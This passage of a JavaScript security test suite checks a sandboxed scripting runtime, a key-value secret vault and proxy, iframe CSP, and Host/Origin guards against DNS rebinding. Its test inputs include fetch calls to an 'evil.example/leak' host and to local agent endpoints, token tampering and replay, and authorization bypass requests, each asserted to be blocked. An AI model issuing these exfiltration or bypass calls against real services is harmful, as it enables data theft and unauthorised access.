    '; add $picked $asyncVal',
   ],
   {
    initialState: {
     asyncFetch: () => Promise.resolve(12),
    },
   }
  )
  assert.equal(protoThenCalls, 0, 'Polluted Object.prototype.then / Function.prototype.then must never be called')
  assert.equal(pollutedRun.results[4].value, 42)

  // Throwing getter on Object.prototype.then must not even be invoked by isThenable
  Object.defineProperty(Object.prototype, 'then', {
   configurable: true,
   get() {
    throw new Error('poisoned Object.prototype.then getter triggered')
   },
  })
  assert.equal(isThenable({}), false)
  const getterSafeRun = await runLines(['; to box ; object { ok true }', '$box.ok'])
  assert.equal(getterSafeRun.results[0].error, null)
  assert.equal(getterSafeRun.results[1].value, true)
 }
 finally {
  delete Object.prototype.then
  delete Function.prototype.then
 }

 // 6. Worker realm seals intrinsic prototypes against extension & freezes Math/JSON while returning null-prototype state
 try {
  const workerOut = await runLinesInWorker([
   "; to blockedCtor [ ; try ( !Array.constructor 'return 1' ) : 'no-ctor' ]",
   "; to blockedMathWrite [ ; try ( ; set 0 Math.PI ) : 'frozen-math' ]",
   '; to mathPi $Math.PI',
  ])
  assert.equal(Object.getPrototypeOf(workerOut.state), null)
  assert.equal(workerOut.state.blockedCtor, 'no-ctor')
  assert.equal(workerOut.state.blockedMathWrite, 'frozen-math')
  assert.equal(workerOut.state.mathPi, Math.PI)
 }
 finally {
  disposeIdleSourceWorkers()
 }
})

function createSwitchableMemoryBackendKv() {
 const storesByDir = new Map()
 const getStore = dir => {
  const slot = dir === null || dir === undefined ? '__default__' : String(dir)
  if (!storesByDir.has(slot)) {
   storesByDir.set(slot, new Map())
  }
  return storesByDir.get(slot)
 }

 const makeClient = (namespace = '', basePath = null, rootRef = null, defaultRootRef = null) => {
  const isHash = namespace.includes('#')
  const qualify = k => (
   isHash
    ? (namespace.endsWith('#') ? `${namespace}${k}` : `${namespace}/${k}`)
    : (namespace ? `${namespace}.${k}` : String(k))
  )
  const store = getStore(basePath)
  const client = {
   prefix: namespace,
   basePath,
   root: rootRef || null,
   defaultRoot: defaultRootRef || null,
   getActiveClient() {
    return client
   },
   withBasePath(nextPath) {
    const clean = nextPath === null || nextPath === undefined || String(nextPath).trim() === ''
     ? null
     : String(nextPath).trim()
    return makeClient('', clean, null, defaultClient)
   },
   namespace(name) {
    const nextNs = isHash ? qualify(encodeKeySegment(name)) : qualify(name)
    return makeClient(nextNs, basePath, client.root, client.defaultRoot)
   },
   hashNamespace(name) {
    return makeClient(`${encodeKeySegment(name)}#`, basePath, client.root, client.defaultRoot)
   },
   async get(key) {
    const full = qualify(key)
    return store.has(full) ? store.get(full) : null
   },
   async set(key, value) {
    store.set(qualify(key), String(value))
   },
   async delete(key) {
    store.delete(qualify(key))
   },
  }
  if (!client.root) {
   client.root = client
  }
  if (!client.defaultRoot) {
   client.defaultRoot = basePath === null ? client : defaultClient
  }
  return client
 }

 const defaultClient = makeClient('', null, null, null)
 let activeClient = defaultClient
 const router = {
  storesByDir,
  get prefix() {
   return activeClient.prefix
  },
  get basePath() {
   return activeClient.basePath
  },
  get root() {
   return activeClient
  },
  defaultRoot: defaultClient,
  getActiveClient() {
   return activeClient
  },
  withBasePath(nextPath) {
   return defaultClient.withBasePath(nextPath)
  },
  setBasePath(nextPath) {
   activeClient = defaultClient.withBasePath(nextPath)
   return activeClient
  },
  namespace(name) {
   return activeClient.namespace(name)
  },
  hashNamespace(name) {
   return activeClient.hashNamespace(name)
  },
  get(key) {
   return activeClient.get(key)
  },
  set(key, value) {
   return activeClient.set(key, value)
  },
  delete(key) {
   return activeClient.delete(key)
  },
 }
 return router
}

test('attenuateKv wraps env.data in a frozen null-prototype capability object without root/defaultRoot/withBasePath/hashNamespace', async () => {
 const rawBackend = createSwitchableMemoryBackendKv()
 const laneRaw = rawBackend.namespace('lane-att-1')
 const wrapped = attenuateKv(laneRaw)

 assert.ok(wrapped)
 assert.equal(Object.getPrototypeOf(wrapped), null)
 assert.equal(Object.isFrozen(wrapped), true)
 assert.deepEqual(
  Object.getOwnPropertyNames(wrapped).sort(),
  ['delete', 'get', 'namespace', 'set']
 )
 assert.deepEqual(Object.getOwnPropertySymbols(wrapped), [])
 assert.equal(wrapped.root, undefined)
 assert.equal(wrapped.defaultRoot, undefined)
 assert.equal(wrapped.withBasePath, undefined)
 assert.equal(wrapped.setBasePath, undefined)
 assert.equal(wrapped.hashNamespace, undefined)
 assert.equal(wrapped.getActiveClient, undefined)
 assert.equal(wrapped.prefix, undefined)
 assert.equal(wrapped.basePath, undefined)

 // Nested namespace returns another frozen null-prototype wrapper
 const sub = wrapped.namespace('cache')
 assert.equal(Object.getPrototypeOf(sub), null)
 assert.equal(Object.isFrozen(sub), true)
 assert.deepEqual(Object.getOwnPropertyNames(sub).sort(), ['delete', 'get', 'namespace', 'set'])
 assert.equal(sub.root, undefined)
 assert.equal(sub.hashNamespace, undefined)

 await wrapped.set('hits', '3')
 await sub.set('item', 'ok')
 assert.equal(await wrapped.get('hits'), '3')
 assert.equal(await sub.get('item'), 'ok')
 assert.equal(rawBackend.storesByDir.get('__default__').get('lane-att-1.hits'), '3')
 assert.equal(rawBackend.storesByDir.get('__default__').get('lane-att-1.cache.item'), 'ok')
 await sub.delete('item')
 assert.equal(await sub.get('item'), null)

 // Hash-namespace escape & null-byte / empty keys are rejected
 assert.throws(() => wrapped.get('vault#master-key'), /Invalid KV key/)
 assert.throws(() => wrapped.set('lanes#other/script', 'x'), /Invalid KV key/)
 assert.throws(() => wrapped.delete('packages#default/meta'), /Invalid KV key/)
 assert.throws(() => wrapped.namespace('sessions#s1'), /Invalid KV namespace/)
 assert.throws(() => wrapped.get(''), /Invalid KV key/)
 assert.throws(() => wrapped.get('bad\0key'), /Invalid KV key/)

 // Verify both in-process FieldScript and isolated Worker env.data expose only the attenuated capability interface
 const inProcOut = await runLines(
  [
   '; to rRoot $data.root',
   '; to rDefaultRoot $data.defaultRoot',
   '; to rWithBase $data.withBasePath',
   '; to rHashNs $data.hashNamespace',
   "; to hashEscape [ ; try ( !data.get 'vault#master-key' ) : 'blocked-hash' ]",
   '!data.set counter 9',
   '; to counterVal !data.get counter',
  ],
  { initialState: { data: wrapped } }
 )
 assert.equal(inProcOut.state.rRoot, undefined)
 assert.equal(inProcOut.state.rDefaultRoot, undefined)
 assert.equal(inProcOut.state.rWithBase, undefined)
 assert.equal(inProcOut.state.rHashNs, undefined)
 assert.equal(inProcOut.state.hashEscape, 'blocked-hash')
 assert.equal(inProcOut.state.counterVal, '9')

 try {
  const workerOut = await runLinesInWorker(
   [
    '; to wRoot $data.root',
    '; to wDefaultRoot $data.defaultRoot',
    '; to wWithBase $data.withBasePath',
    '; to wHashNs $data.hashNamespace',
    "; to wHashEscape [ ; try ( !data.get 'vault#master-key' ) : 'worker-blocked-hash' ]",
    '; to sub !data.namespace metrics',
    '!sub.set count 12',
    '; to subVal !sub.get count',
   ],
   { initialState: { data: laneRaw } }
  )
  assert.equal(workerOut.state.wRoot, undefined)
  assert.equal(workerOut.state.wDefaultRoot, undefined)
  assert.equal(workerOut.state.wWithBase, undefined)
  assert.equal(workerOut.state.wHashNs, undefined)
  assert.equal(workerOut.state.wHashEscape, 'worker-blocked-hash')
  assert.equal(workerOut.state.subVal, '12')
 }
 finally {
  disposeIdleSourceWorkers()
 }
})

test('server-only secret store removes vault#master-key & passphrase hashes from KV and enforces lane/package session tokens at /api/data proxy', async () => {
 const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'cc-vault-proxy-'))
 const vaultFile = path.join(tmpDir, 'secrets', 'vault-secrets.json')
 const backendKv = createSwitchableMemoryBackendKv()
 let proxyServer = null

 try {
  // 1. File-backed server secret store uses 0o700 dir + 0o600 file permissions and survives restarts
  const secretStore = createFileBackedServerSecretStore({ filePath: vaultFile, useEnv: false })
  const masterHex1 = secretStore.getMasterKeyHex()
  assert.match(masterHex1, /^[0-9a-f]{64}$/)
  const fileStat = await fs.stat(vaultFile)
  const dirStat = await fs.stat(path.dirname(vaultFile))
  assert.equal(fileStat.mode & 0o777, 0o600, 'Vault secret file must be 0o600')
  assert.equal(dirStat.mode & 0o777, 0o700, 'Vault secret directory must be 0o700')

  const reloadedStore = createFileBackedServerSecretStore({ filePath: vaultFile, useEnv: false })
  assert.equal(reloadedStore.getMasterKeyHex(), masterHex1, 'Reloaded server secret store must keep identical master key')

  // Legacy vault#master-key migration deletes vault#master-key from KV after importing into a fresh server store
  const legacyKv = createSwitchableMemoryBackendKv()
  const legacyHex = 'ab'.repeat(32)
  await legacyKv.set(vaultMasterKey(), legacyHex)
  const migrationStore = createServerSecretStore({ useEnv: false })
  bindSecretStoreToKv(legacyKv, migrationStore)
  const migratedHex = await ensureVaultMasterKey(legacyKv)
  assert.equal(migratedHex, legacyHex)
  assert.equal(await legacyKv.get(vaultMasterKey()), null, 'Legacy vault#master-key must be deleted from KV')

  // 2. Start live loopback HTTP server running handleVaultApiRequest (/api/vault/*) and handleDataProxyRequest (/api/data)
  const proxy = createDataProxyHandler({
   backendKv,
   secretStore,
   setAsDefaultStore: false,
  })
  proxyServer = http.createServer((req, res) => {
   const pathname = (req.url || '/').split('?')[0]
   if (pathname === '/api/vault' || pathname.startsWith('/api/vault/')) {
    return proxy.handleVaultApiRequest(req, res)
   }
   if (pathname === '/api/data' || pathname.startsWith('/api/data/')) {
    return proxy.handleDataProxyRequest(req, res)
   }
   res.writeHead(404)
   res.end('Not found')
  })
  await new Promise(resolve => proxyServer.listen(0, '127.0.0.1', resolve))
  const { port } = proxyServer.address()
  const proxyOrigin = `http://127.0.0.1:${port}`
  const proxyDataUrl = `${proxyOrigin}/api/data?mode=disk`

  assert.equal(isForbiddenDirectKvKey('vault#master-key'), true)
  assert.equal(isForbiddenDirectKvKey('lanes#lane-1/secrets/sec-1'), true)

  // Session A (browser client 1) creates a passphrase-protected VaultPkg, registers lockedLane, and stores a set-once secret
  const clientA = httpKV({ baseUrl: proxyDataUrl, switchable: true, proxyCapabilities: true })
  const winA = {}
  const sessA = await initSessionState(clientA, winA)
  const tokenA0 = clientA.getSessionToken()
  assert.ok(tokenA0.startsWith(CAPABILITY_TOKEN_PREFIX))

  const createdPkg = await createPackage(clientA, sessA.sessionId, {
   name: 'VaultPkg',
   passphrase: 'correct-horse-battery',
  }, winA)
  assert.equal(createdPkg.ok, true)
  const vaultPkgId = createdPkg.pkg.id

  // Verify raw KV package metadata NEVER contains passphraseHash or passphraseSalt
  const rawStoredPkgMeta = JSON.parse(backendKv.storesByDir.get('__default__').get(packageMetaKey(vaultPkgId)))
  assert.equal(rawStoredPkgMeta.hasPassphrase, true)
  assert.equal(Object.hasOwn(rawStoredPkgMeta, 'passphraseHash'), false)
  assert.equal(Object.hasOwn(rawStoredPkgMeta, 'passphraseSalt'), false)

  const lockedLaneId = 'lane-vault-99'
  const publicLaneId = 'lane-public-1'
  await registerLaneInPackage(clientA, lockedLaneId, 'Classified Ops', vaultPkgId)
  await clientA.namespace(lockedLaneId).set('title', 'Classified Ops')
  await saveLaneScript(clientA, clientA.namespace(lockedLaneId), lockedLaneId, ['; to classifiedCode 9001'])

  await registerLaneInPackage(clientA, publicLaneId, 'Public Board', DEFAULT_PACKAGE_ID)
  await clientA.namespace(publicLaneId).set('title', 'Public Board')
  await saveLaneScript(clientA, clientA.namespace(publicLaneId), publicLaneId, ['; to publicVal 42'])

  const rawSecretValue = 'sk_live_TopSecretVaultValue_999'
  const secretSet = await setLaneSecret(
   clientA,
   clientA.namespace(lockedLaneId),
   lockedLaneId,
   'apiKey',
   rawSecretValue
  )
  assert.equal(secretSet.ok, true)
  assert.ok(secretSet.secretId.startsWith('sec-'))

  // Client A (with VaultPkg unlocked) can resolve the secret via /api/vault/resolve, while /api/vault/secret metadata omits ciphertext
  const resolvedByA = await resolveLaneSecret(
   clientA,
   clientA.namespace(lockedLaneId),
   lockedLaneId,
   { type: 'secret', secretId: secretSet.secretId, secretSet: true }
  )
  assert.equal(resolvedByA, rawSecretValue)
  const metaForA = await loadLaneSecretRecord(clientA, clientA.namespace(lockedLaneId), lockedLaneId, secretSet.secretId)
  assert.equal(metaForA.secretSet, true)
  assert.equal(metaForA.ciphertext, undefined, 'Proxy secret metadata endpoint must never expose raw ciphertext')

  // Verify backend KV never had vault#master-key written and plaintext secret never appears anywhere in backend KV
  assert.equal(backendKv.storesByDir.get('__default__').has('vault#master-key'), false)
  for (const [, val] of backendKv.storesByDir.get('__default__').entries()) {
   assert.ok(!String(val).includes(rawSecretValue))
   assert.ok(!String(val).includes(masterHex1))
  }

  // 3. Even if a legacy vault#master-key existed on disk AND Client A presents a valid unlocked token, /api/data unconditionally blocks vault#master-key and lanes#*/secrets/*
  backendKv.storesByDir.get('__default__').set('vault#master-key', 'deadbeef'.repeat(8))
  const tokenAUnlocked = clientA.getSessionToken()
  const vaultProbe = await fetch(`${proxyDataUrl}&key=${encodeURIComponent('vault#master-key')}`, {
   headers: { [SESSION_TOKEN_HEADER]: tokenAUnlocked },
  })
  assert.equal(vaultProbe.status, 403)
  backendKv.storesByDir.get('__default__').delete('vault#master-key')

  const secretKeyProbe = await fetch(
   `${proxyDataUrl}&key=${encodeURIComponent(laneSecretKey(lockedLaneId, secretSet.secretId))}`,
   { headers: { [SESSION_TOKEN_HEADER]: tokenAUnlocked } }
  )
  assert.equal(secretKeyProbe.status, 403)

  // 4. Unauthenticated, tampered, expired, and wrong-directory capability tokens are rejected at /api/data
  const noTokResp = await fetch(`${proxyDataUrl}&key=${encodeURIComponent(`${publicLaneId}.title`)}`)
  assert.equal(noTokResp.status, 401)
  assert.equal(noTokResp.headers.get(TOKEN_BOOTSTRAP_HEADER), '/api/vault/session')

  const tamperedToken = `${tokenAUnlocked.slice(0, -4)}ffff`
  const tamperedResp = await fetch(`${proxyDataUrl}&key=${encodeURIComponent(`${publicLaneId}.title`)}`, {
   headers: { [SESSION_TOKEN_HEADER]: tamperedToken },
  })
  assert.equal(tamperedResp.status, 401)

  const expiredToken = createCapabilityToken({
   sessionId: sessA.sessionId,
   basePath: null,
   packages: [DEFAULT_PACKAGE_ID],
   iat: Date.now() - 10_000,
   exp: Date.now() - 1,
  }, secretStore)
  assert.equal(verifyCapabilityToken(expiredToken, secretStore).ok, false)
  const expiredResp = await fetch(`${proxyDataUrl}&key=${encodeURIComponent(`${publicLaneId}.title`)}`, {
   headers: { [SESSION_TOKEN_HEADER]: expiredToken },
  })
  assert.equal(expiredResp.status, 401)

  const wrongDirResp = await fetch(
   `${proxyDataUrl}&modeOptions.disk.basePath=${encodeURIComponent('/tmp/other-workspace')}&key=${encodeURIComponent(`${publicLaneId}.title`)}`,
   { headers: { [SESSION_TOKEN_HEADER]: tokenAUnlocked } }
  )
  assert.equal(wrongDirResp.status, 403)

  // 5. Session B (ununlocked session) cannot read/write lockedLane, VaultPkg lanes, self-inject VaultPkg, or resolve lockedLane secrets via /api/data or /api/vault/*
  const clientB = httpKV({ baseUrl: proxyDataUrl, switchable: true, proxyCapabilities: true })
  const winB = {}
  const sessB = await initSessionState(clientB, winB)
  const tokenBLocked = clientB.getSessionToken()
  assert.deepEqual(sessB.openPackageIds, [DEFAULT_PACKAGE_ID])

  // Public lane in Default package IS accessible to Session B
  assert.equal(await clientB.namespace(publicLaneId).get('title'), 'Public Board')

  // Package ownership & sanitized package meta ARE readable so UI can display Locked Lane prompt without leaking hash/salt
  const ownerPkgResp = await fetch(
   `${proxyDataUrl}&key=${encodeURIComponent(`lanes#${encodeKeySegment(lockedLaneId)}/package`)}`,
   { headers: { [SESSION_TOKEN_HEADER]: tokenBLocked } }
  )
  assert.equal(ownerPkgResp.status, 200)
  assert.equal(await ownerPkgResp.text(), vaultPkgId)

  const pkgMetaResp = await fetch(
   `${proxyDataUrl}&key=${encodeURIComponent(packageMetaKey(vaultPkgId))}`,
   { headers: { [SESSION_TOKEN_HEADER]: tokenBLocked } }
  )
  assert.equal(pkgMetaResp.status, 200)
  const pkgMetaJson = JSON.parse(await pkgMetaResp.text())
  assert.equal(pkgMetaJson.name, 'VaultPkg')
  assert.equal(pkgMetaJson.hasPassphrase, true)
  assert.equal(pkgMetaJson.passphraseHash, undefined)
  assert.equal(pkgMetaJson.passphraseSalt, undefined)

  // Direct /api/data bypass attempts using Session B's valid token MUST all return 403 Forbidden
  const bypassTargets = [
   ['GET', `lanes#${encodeKeySegment(lockedLaneId)}/script-index`, null],
   ['GET', `${lockedLaneId}.title`, null],
   ['POST', `${lockedLaneId}.title`, 'Pwned Title'],
   ['DELETE', `${lockedLaneId}.title`, null],
   ['GET', `stories#${encodeKeySegment(lockedLaneId)}/idx/root`, null],
   ['GET', `packages#${encodeKeySegment(vaultPkgId)}/lanes-index`, null],
   ['POST', `lanes#${encodeKeySegment(lockedLaneId)}/package`, DEFAULT_PACKAGE_ID],
   ['POST', `sessions#${encodeKeySegment(sessB.sessionId)}/packages-index`, JSON.stringify([DEFAULT_PACKAGE_ID, vaultPkgId])],
  ]
  for (const [method, key, body] of bypassTargets) {
   const r = await fetch(`${proxyDataUrl}&key=${encodeURIComponent(key)}`, {
    method,
    headers: { [SESSION_TOKEN_HEADER]: tokenBLocked },
    ...(body !== null ? { body } : {}),
   })
   assert.equal(r.status, 403, `Expected 403 at /api/data proxy for ${method} ${key}`)
  }

  // Attempting to resolve lockedLane's secret from Session B is rejected by /api/vault/resolve (returns empty string)
  const blockedSecretResolve = await resolveLaneSecret(
   clientB,
   clientB.namespace(lockedLaneId),
   lockedLaneId,
   { type: 'secret', secretId: secretSet.secretId, secretSet: true }
  )
  assert.equal(blockedSecretResolve, '')

  // Wrong passphrase fails unlock at /api/vault/package/open and keeps /api/data blocked
  const badOpen = await openPackageInSession(clientB, sessB.sessionId, {
   packageId: vaultPkgId,
   passphrase: 'wrong-passphrase',
  }, winB)
  assert.equal(badOpen.ok, false)
  assert.equal(badOpen.needsPassphrase, true)
  await assert.rejects(() => clientB.namespace(lockedLaneId).get('title'), /HTTP 403/)

  // Correct passphrase unlocks VaultPkg on the server, mints upgraded capability token, and enables access
  const goodOpen = await openPackageInSession(clientB, sessB.sessionId, {
   packageId: vaultPkgId,
   passphrase: 'correct-horse-battery',
  }, winB)
  assert.equal(goodOpen.ok, true)
  const preCloseTokenB = clientB.getSessionToken()
  assert.equal(await clientB.namespace(lockedLaneId).get('title'), 'Classified Ops')
  const loadedLockedScript = await loadLaneScript(clientB, clientB.namespace(lockedLaneId), lockedLaneId)
  assert.equal(loadedLockedScript.records[0].text, '; to classifiedCode 9001')
  assert.equal(
   await resolveLaneSecret(clientB, clientB.namespace(lockedLaneId), lockedLaneId, {
    type: 'secret',
    secretId: secretSet.secretId,
    secretSet: true,
   }),
   rawSecretValue
  )

  // 6. Closing VaultPkg downgrades Session B's token AND revokes preCloseTokenB at the HTTP proxy layer
  await closePackageInSession(clientB, sessB.sessionId, vaultPkgId)
  await assert.rejects(() => clientB.namespace(lockedLaneId).get('title'), /HTTP 403/)
  const replayResp = await fetch(`${proxyDataUrl}&key=${encodeURIComponent(`${lockedLaneId}.title`)}`, {
   headers: { [SESSION_TOKEN_HEADER]: preCloseTokenB },
  })
  assert.equal(replayResp.status, 403, 'Replaying a pre-close session token must be rejected after package close')

  //Meanwhile Session A's independent grant for VaultPkg remains valid!
  assert.equal(await clientA.namespace(lockedLaneId).get('title'), 'Classified Ops')

  // 7. Lane-scoped capability token (/api/vault/lane-token) permits ONLY the specified laneId
  const laneTokRes = await clientA.fetchVaultApi('lane-token', {
   method: 'POST',
   body: { lanes: [publicLaneId] },
  })
  // Restore Client A's session token (fetchVaultApi returned lane token)
  const laneOnlyToken = laneTokRes.data.token
  clientA.setSessionToken(tokenAUnlocked, { sessionId: sessA.sessionId, basePath: null })

  const allowedLaneRead = await fetch(`${proxyDataUrl}&key=${encodeURIComponent(`${publicLaneId}.title`)}`, {
   headers: { [SESSION_TOKEN_HEADER]: laneOnlyToken },
  })
  assert.equal(allowedLaneRead.status, 200)
  assert.equal(await allowedLaneRead.text(), 'Public Board')

  const blockedOtherLane = await fetch(`${proxyDataUrl}&key=${encodeURIComponent(`${lockedLaneId}.title`)}`, {
   headers: { [SESSION_TOKEN_HEADER]: laneOnlyToken },
  })
  assert.equal(blockedOtherLane.status, 403)

  const blockedPkgReassign = await fetch(
   `${proxyDataUrl}&key=${encodeURIComponent(`lanes#${encodeKeySegment(publicLaneId)}/package`)}`,
   { headers: { [SESSION_TOKEN_HEADER]: laneOnlyToken } }
  )
  assert.equal(blockedPkgReassign.status, 403)

  const blockedWorkspaceKey = await fetch(`${proxyDataUrl}&key=clock-timezone`, {
   headers: { [SESSION_TOKEN_HEADER]: laneOnlyToken },
  })
  assert.equal(blockedWorkspaceKey.status, 403)

  // Deleting secret via Client A removes it cleanly
  const delSec = await deleteLaneSecret(clientA, clientA.namespace(lockedLaneId), lockedLaneId, secretSet.secretId)
  assert.equal(delSec.ok, true)
  assert.equal(await loadLaneSecretRecord(clientA, clientA.namespace(lockedLaneId), lockedLaneId, secretSet.secretId), null)
 }
 finally {
  if (proxyServer) {
   await new Promise(resolve => proxyServer.close(resolve))
  }
  await fs.rm(tmpDir, { recursive: true, force: true })
 }
})

test('buildSandboxedOutputSrcdoc enforces strict CSP (script sha256 hash, connect-src none, no inline/eval scripts) and blocks outbound network calls', async () => {
 const rawModuleWithCrlf = "const greeting = 'hello'\r\nconst two = 2"
 const srcdoc = buildSandboxedOutputSrcdoc({
  frameId: 'csp-frame-1',
  fieldModuleSource: rawModuleWithCrlf,
 })

 const charsetIdx = srcdoc.indexOf('<meta charset="utf-8">')
 const cspMatch = /<meta http-equiv="Content-Security-Policy" content="([^"]+)">/.exec(srcdoc)
 const styleIdx = srcdoc.indexOf('<style>')
 const scriptMatch = /<script type="module">([\s\S]*?)<\/script>/.exec(srcdoc)

 assert.ok(charsetIdx !== -1, 'srcdoc must contain charset meta tag')
 assert.ok(cspMatch, 'srcdoc must include <meta http-equiv="Content-Security-Policy">')
 assert.ok(cspMatch.index > charsetIdx && cspMatch.index < styleIdx, 'CSP meta tag must appear inside <head> right after charset')
 assert.ok(scriptMatch, 'srcdoc must include inline <script type="module">')

 const csp = cspMatch[1]
 const directives = new Map(
  csp.split(';').map(part => {
   const trimmed = part.trim()
   const spaceIdx = trimmed.indexOf(' ')
   return spaceIdx === -1 ? [trimmed, ''] : [trimmed.slice(0, spaceIdx), trimmed.slice(spaceIdx + 1)]
  })
 )

 assert.equal(directives.get('default-src'), "'none'")
 assert.equal(directives.get('connect-src'), "'none'")
 assert.equal(directives.get('frame-src'), "'none'")
 assert.equal(directives.get('child-src'), "'none'")
 assert.equal(directives.get('worker-src'), "'none'")
 assert.equal(directives.get('object-src'), "'none'")
 assert.equal(directives.get('base-uri'), "'none'")
 assert.equal(directives.get('form-action'), "'none'")
 assert.equal(directives.get('img-src'), 'data: blob:')
 assert.equal(directives.get('font-src'), 'data:')
 assert.equal(directives.get('media-src'), 'data: blob:')
 assert.equal(directives.get('style-src'), "'unsafe-inline'")

 const scriptSrc = directives.get('script-src') || ''
 assert.ok(!scriptSrc.includes("'unsafe-inline'"), 'script-src must NOT allow unsafe-inline')
 assert.ok(!scriptSrc.includes("'unsafe-eval'"), 'script-src must NOT allow unsafe-eval')

 const scriptBody = scriptMatch[1]
 assert.ok(!scriptBody.includes('\r'), 'srcdoc inline script must normalize CRLF to LF before hashing')
 const expectedHash = crypto.createHash('sha256').update(scriptBody, 'utf8').digest('base64')
 assert.equal(scriptSrc, `'sha256-${expectedHash}'`)
 assert.equal(csp, buildSandboxedOutputCsp(scriptBody))

 // Verify mock iframe sandbox blocks external fetch, local :8080 fetch, and navigator.sendBeacon
 const hostListeners = {}
 const hostWindow = {
  addEventListener(type, fn) {
   hostListeners[type] ||= []
   hostListeners[type].push(fn)
  },
  removeEventListener(type, fn) {
   hostListeners[type] = (hostListeners[type] || []).filter(h => h !== fn)
  },
 }
 const hostDocument = {
  createElement(tag) {
   return { tag, style: {}, attributes: {}, children: [], setAttribute(k, v) { this.attributes[k] = v }, remove() {} }
  },
 }
 const viewportEl = {
  children: [],
  appendChild(c) { this.children.push(c) },
  replaceChildren() { this.children = [] },
 }
 const host = createSandboxedOutputHost({ document: hostDocument, window: hostWindow, viewportEl })
 try {
  const t = createTransport()
  const f = field({}, { transport: t })
  await f.run(parse([
   `; send (
    ; to report ; object
    ; set [ ; try ( !window.fetch 'https://evil.example/leak' ) : 'blocked-external-fetch' ] report.extFetch
    ; set [ ; try ( !window.fetch 'http://localhost:8080/api/agent/sessions' ) : 'blocked-local-fetch' ] report.localFetch
    ; set [ ; try ( !window.navigator.sendBeacon 'http://localhost:8080/api/agent/lane/script' '{}' ) : 'blocked-send-beacon' ] report.beacon
    ; to out !document.createElement pre
    ; set [ !JSON.stringify $report ] out.textContent
    $out
   )`,
  ].join('\n')))
  const outcome = await host.render(t.packets())
  assert.equal(outcome.results[0].error, null)
  const report = JSON.parse(host.debugOutputEl.children[0].textContent)
  assert.equal(report.extFetch, 'blocked-external-fetch')
  assert.equal(report.localFetch, 'blocked-local-fetch')
  assert.equal(report.beacon, 'blocked-send-beacon')
 }
 finally {
  host.dispose()
 }
})

test('Hardened :8080 HTTP/WS boundary: Origin: null, Sec-Fetch-Site, Content-Type 415, POST-only eval, capability-scoped agent/MCP/FS/deploy, and DNS rebinding', async () => {
 // 1. Unit checks for http-security.mjs Host, Origin, Sec-Fetch-Site, and Content-Type guards
 assert.equal(isAllowedLocalHost({ headers: { host: 'localhost:8080' } }, { requireHost: true }), true)
 assert.equal(isAllowedLocalHost({ headers: { host: '127.0.0.1:8080' } }, { requireHost: true }), true)
 assert.equal(isAllowedLocalHost({ headers: { host: '[::1]:8080' } }, { requireHost: true }), true)
 assert.equal(isAllowedLocalHost({ headers: {} }, { requireHost: true }), false)
 assert.equal(isAllowedLocalHost({ headers: { host: 'rebind.evil.com:8080' } }, { requireHost: true }), false)
 assert.equal(isAllowedLocalHost({ headers: { host: 'localhost.evil.com:8080' } }, { requireHost: true }), false)
 assert.equal(isAllowedLocalHost({ headers: { host: 'localhost@evil.com:8080' } }, { requireHost: true }), false)
 assert.equal(isAllowedLocalHost({ headers: { host: '127.0.0.1:99999' } }, { requireHost: true }), false)
 assert.equal(isAllowedLocalHost({ headers: { host: ['localhost:8080', 'evil.com'] } }, { requireHost: true }), false)
 assert.equal(
  isAllowedLocalHost({ headers: { host: 'civil.example.com:8080' } }, { requireHost: true, allowedHosts: ['civil.example.com', '*'], useEnv: false }),
  true
 )

 assert.equal(isAllowedLocalOrigin({ headers: { host: 'localhost:8080', origin: 'null' } }), false)
 assert.equal(isAllowedLocalOrigin({ headers: { host: 'localhost:8080', origin: 'NULL' } }), false)
 assert.equal(isAllowedLocalOrigin({ headers: { host: 'localhost:8080', origin: 'https://evil.example' } }), false)
 assert.equal(isAllowedLocalOrigin({ headers: { host: 'localhost:8080', origin: 'http://localhost:3000' } }), false)
 assert.equal(isAllowedLocalOrigin({ headers: { host: 'rebind.evil.com:8080', origin: 'http://rebind.evil.com:8080' } }), false)
 assert.equal(isAllowedLocalOrigin({ headers: { host: 'localhost:8080', 'sec-fetch-site': 'cross-site' } }), false)
 assert.equal(isAllowedLocalOrigin({ headers: { host: 'localhost:8080', 'sec-fetch-site': 'same-site' } }), false)
 assert.equal(isAllowedLocalOrigin({ headers: { host: 'localhost:8080', origin: 'http://localhost:8080', 'sec-fetch-site': 'same-origin' } }), true)
 assert.equal(isAllowedLocalOrigin({ headers: { host: 'localhost:8080', 'sec-fetch-site': 'none' } }), true)
 assert.equal(
  isAllowedLocalOrigin(
   { headers: { host: 'civil.example.com:8080', origin: 'https://civil.example.com:8080' } },
   { allowedHosts: ['civil.example.com'], useEnv: false }
  ),
  true
 )
 assert.equal(
  isAllowedLocalOrigin(
   { headers: { host: 'civil.example.com:8080', origin: 'null' } },
   { allowedHosts: ['civil.example.com'], useEnv: false }
  ),
  false
 )
 const prevAllowedHostsEnv = process.env.CC_ALLOWED_HOSTS
 try {
  process.env.CC_ALLOWED_HOSTS = 'civil.example.com, *'
  assert.equal(
   isAllowedLocalHost({ headers: { host: 'civil.example.com:8080' } }, { requireHost: true }),
   true
  )
  assert.equal(
   isAllowedLocalOrigin({ headers: { host: 'civil.example.com:8080', origin: 'https://civil.example.com:8080' } }),
   true
  )
  assert.equal(
   isAllowedLocalOrigin({ headers: { host: 'civil.example.com:8080', origin: 'null' } }),
   false
  )
  assert.equal(
   isAllowedLocalHost({ headers: { host: 'other.attacker.example:8080' } }, { requireHost: true }),
   false
  )
 }
 finally {
  if (prevAllowedHostsEnv === undefined) delete process.env.CC_ALLOWED_HOSTS
  else process.env.CC_ALLOWED_HOSTS = prevAllowedHostsEnv
 }

 assert.equal(hasJsonContentType({ headers: { 'content-type': 'application/json' } }), true)
 assert.equal(hasJsonContentType({ headers: { 'content-type': 'application/json; charset=utf-8' } }), true)
 assert.equal(hasJsonContentType({ headers: { 'content-type': 'text/plain' } }), false)
 assert.equal(hasJsonContentType({ headers: { 'content-type': 'application/x-www-form-urlencoded' } }), false)
 assert.equal(hasJsonContentType({ headers: {} }), false)

 // 2. Boot loopback server matching `start`'s exact routing and security boundary
 const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'cc-csrf-hardening-'))
 const vaultFile = path.join(tmpDir, 'secrets', 'vault-secrets.json')
 const fsHome = path.join(tmpDir, 'fs-home')
 await fs.mkdir(fsHome, { recursive: true })
 const backendKv = createSwitchableMemoryBackendKv()
 const secretStore = createFileBackedServerSecretStore({ filePath: vaultFile, useEnv: false })
 const proxy = createDataProxyHandler({ backendKv, secretStore, setAsDefaultStore: false })
 const eventHub = createAgentEventHub()
 const emittedEvents = []
 eventHub.subscribe(ev => emittedEvents.push(ev))
